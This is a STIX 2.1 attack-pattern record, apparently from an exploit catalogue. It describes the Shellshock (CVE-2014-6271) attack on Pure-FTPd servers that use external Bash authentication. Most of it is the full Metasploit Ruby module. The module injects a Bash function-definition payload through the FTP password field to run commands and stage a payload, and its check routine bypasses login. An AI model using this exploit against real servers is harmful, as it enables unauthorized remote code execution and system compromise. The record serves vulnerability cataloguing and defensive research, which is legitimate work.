{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e9430d7f-20b2-46ee-b2ef-4f5c29a3b2fb",
    "created": "2024-08-14T17:07:17.26534Z",
    "modified": "2024-08-14T17:07:17.265345Z",
    "name": "Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)",
    "description": "( This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets the Pure-FTPd FTP server when it has been compiled with the --with-extauth flag and an external Bash script is used for authentication. If the server is not set up this way the exploit will fail, even if the version of Bash in use is vulnerable. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/ftp/pureftpd_bash_env_exec.rb",
            "external_id": "pureftpd_bash_env_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6271"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc"
        },
        {
            "source_name": "reference",
            "url": "http://download.pureftpd.org/pub/pure-ftpd/doc/README.Authentication-Modules"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)',\n      'Description'     => %q(\n        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell\n        handles external environment variables. This module targets the Pure-FTPd FTP\n        server when it has been compiled with the --with-extauth flag and an external\n        Bash script is used for authentication. If the server is not set up this way,\n        the exploit will fail, even if the version of Bash in use is vulnerable.\n      ),\n      'Author'          =>\n        [\n          'Stephane Chazelas', # Vulnerability discovery\n          'Frank Denis', # Discovery of Pure-FTPd attack vector\n          'Spencer McIntyre' # Metasploit module\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2014-6271' ],\n          [ 'CWE', '94' ],\n          [ 'OSVDB', '112004' ],\n          [ 'EDB', '34765' ],\n          [ 'URL', 'https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc' ],\n          [ 'URL', 'http://download.pureftpd.org/pub/pure-ftpd/doc/README.Authentication-Modules' ]\n        ],\n      'Payload'         =>\n        {\n          'DisableNops' => true,\n          'Space'       => 2048\n        },\n      'Targets'         =>\n        [\n          [ 'Linux x86',\n            {\n              'Platform'        => 'linux',\n              'Arch'            => ARCH_X86,\n              'CmdStagerFlavor' => :printf\n            }\n          ],\n          [ 'Linux x86_64',\n            {\n              'Platform'        => 'linux',\n              'Arch'            => ARCH_X64,\n              'CmdStagerFlavor' => :printf\n            }\n          ]\n        ],\n      'DefaultOptions' =>\n        {\n          'PrependFork' => true\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-09-24',\n      'Notes'          =>\n        {\n          'AKA'         => [ 'Shellshock' ],\n          'Stability'   => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],\n          'Reliability' => [ REPEATABLE_SESSION, ],\n        },\n    ))\n    register_options(\n      [\n        Opt::RPORT(21),\n        OptString.new('RPATH', [true, 'Target PATH for binaries used by the CmdStager', '/bin'])\n      ])\n    deregister_options('FTPUSER', 'FTPPASS')\n  end\n\n  def check\n    # this check method tries to use the vulnerability to bypass the login\n    username = rand_text_alphanumeric(rand(20) + 1)\n    random_id = (rand(100) + 1)\n    command = \"echo auth_ok:1; echo uid:#{random_id}; echo gid:#{random_id}; echo dir:/tmp; echo end\"\n    if send_command(username, command) =~ /^2\\d\\d ok./i\n      disconnect\n      return CheckCode::Safe if banner !~ /pure-ftpd/i\n\n      command = \"echo auth_ok:0; echo end\"\n      if send_command(username, command) =~ /^5\\d\\d login authentication failed/i\n        disconnect\n        return CheckCode::Vulnerable\n      end\n    end\n    disconnect\n\n    CheckCode::Safe\n  end\n\n  def execute_command(cmd, _opts)\n    cmd.gsub!('chmod', \"#{datastore['RPATH']}/chmod\")\n    username = rand_text_alphanumeric(rand(20) + 1)\n    send_command(username, cmd)\n  end\n\n  def exploit\n    execute_cmdstager(linemax: 500)\n    handler\n  end\n\n  def send_command(username, cmd)\n    cmd = \"() { :;}; #{datastore['RPATH']}/sh -c \\\"#{cmd}\\\"\"\n    connect\n    send_user(username)\n    password_result = send_pass(cmd)\n    disconnect\n    password_result\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-24",
    "x_mitre_platforms": [
        "linux'"
    ]
}